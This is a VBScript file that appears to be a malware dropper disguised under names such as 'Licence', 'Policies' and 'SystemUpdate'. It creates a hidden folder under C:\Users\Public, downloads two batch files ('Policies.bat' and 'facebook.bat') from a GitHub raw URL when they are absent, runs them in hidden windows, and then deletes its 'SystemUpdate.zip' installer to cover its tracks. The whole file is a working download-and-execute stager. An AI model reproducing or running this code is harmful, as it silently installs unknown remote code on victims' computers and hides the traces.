Dim FSO
Set WshShell = CreateObject( "WScript.Shell" )
Set FSO = CreateObject("Scripting.FileSystemObject")

Dim User 
Dim Path
Dim Loc1 
Dim Loc2 
Dim Loc3 
Dim Loc4 

Path = "C:\Users\Public\Licence\Extension"





If Not fso.FolderExists(Path) Then
	FSO.CreateFolder "C:\Users\Public\Licence" 
	FSO.CreateFolder "C:\Users\Public\Licence\Extension" 
End If







User = WshShell.ExpandEnvironmentStrings( "%USERNAME%" )
Loc1 = "C:\Users\Public\Licence\Extension\Policies.bat"
Loc2 = "C:\Users\"+ User + "\AppData\Local\Temp\afolder\Policies.bat"
Loc3 = ".\Policies.bat"


If fso.FileExists(Loc1) Then
   WshShell.CurrentDirectory=Path 
   WshShell.Run chr(34) & "C:\Users\Public\Licence\Extension\Policies.bat" & Chr(34), 0


Elseif fso.FileExists(Loc2) Then
   WshShell.CurrentDirectory=Path 
   WshShell.Run chr(34) & "C:\Users\"+ User + "\AppData\Local\Temp\afolder\Policies.bat" & Chr(34), 0


Elseif fso.FileExists(Loc3) Then
   WshShell.Run chr(34) & ".\Policies.bat" & Chr(34), 0


Else
   '  MsgBox "[?] Please check your internet connection and try again!"
        WshShell.CurrentDirectory=Path 
    	Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")

	URL = "https://github.com/win32u/Licence/blob/main/UserSohel/Policies.bat?raw=true"
	objWinHttp.open "GET", URL, False
	objWinHttp.send ""

	SaveBinaryData ".\Policies.bat",objWinHttp.responseBody
	Function SaveBinaryData(FileName, Data)
	Const adTypeText = 1
	Const adSaveCreateOverWrite = 2
	Dim BinaryStream
	Set BinaryStream = CreateObject("ADODB.Stream")
	BinaryStream.Type = adTypeText
	BinaryStream.Open
	BinaryStream.Write Data
	BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
	End Function
   WScript.Sleep 1000
   WshShell.Run chr(34) & ".\Policies.bat" & Chr(34), 0

End If




Loc1 = "C:\Users\Public\Licence\Extension\facebook.bat"
Loc2 = "C:\Users\"+ User + "\AppData\Local\Temp\afolder\facebook.bat"
Loc3 = ".\facebook.bat"
Loc4 = Left(WScript.ScriptFullName,InStrRev(WScript.ScriptFullName,"\")) + ".data\SystemUpdate.zip"
Path = "C:\Users\Public\Licence\Extension"


If fso.FileExists(Loc1) Then
   WshShell.CurrentDirectory=Path 
   WshShell.Run chr(34) & "C:\Users\Public\Licence\Extension\facebook.bat" & Chr(34), 0
   Set WshShell = Nothing 

Elseif fso.FileExists(Loc2) Then
   WshShell.CurrentDirectory=Path 
   WshShell.Run chr(34) & "C:\Users\"+ User + "\AppData\Local\Temp\afolder\facebook.bat" & Chr(34), 0
   Set WshShell = Nothing 

Elseif fso.FileExists(Loc3) Then
   WshShell.Run chr(34) & ".\facebook.bat" & Chr(34), 0
   Set WshShell = Nothing 

Else
   '  MsgBox "[?] Please check your internet connection and try again!"
        WshShell.CurrentDirectory=Path 
    	Set objWinHttp = CreateObject("WinHttp.WinHttpRequest.5.1")

	URL = "https://github.com/win32u/Licence/blob/main/UserSohel/facebook.bat?raw=true"
	objWinHttp.open "GET", URL, False
	objWinHttp.send ""

	SaveBinaryData ".\facebook.bat",objWinHttp.responseBody
	Function SaveBinaryData(FileName, Data)
	Const adTypeText = 1
	Const adSaveCreateOverWrite = 2
	Dim BinaryStream
	Set BinaryStream = CreateObject("ADODB.Stream")
	BinaryStream.Type = adTypeText
	BinaryStream.Open
	BinaryStream.Write Data
	BinaryStream.SaveToFile FileName, adSaveCreateOverWrite
	End Function
   WScript.Sleep 1000
   WshShell.Run chr(34) & ".\facebook.bat" & Chr(34), 0
   Set WshShell = Nothing
End If


If fso.FileExists(Loc4) Then
   FSO.DeleteFile Loc4 
   Set FSO=Nothing    
End If
WScript.Quit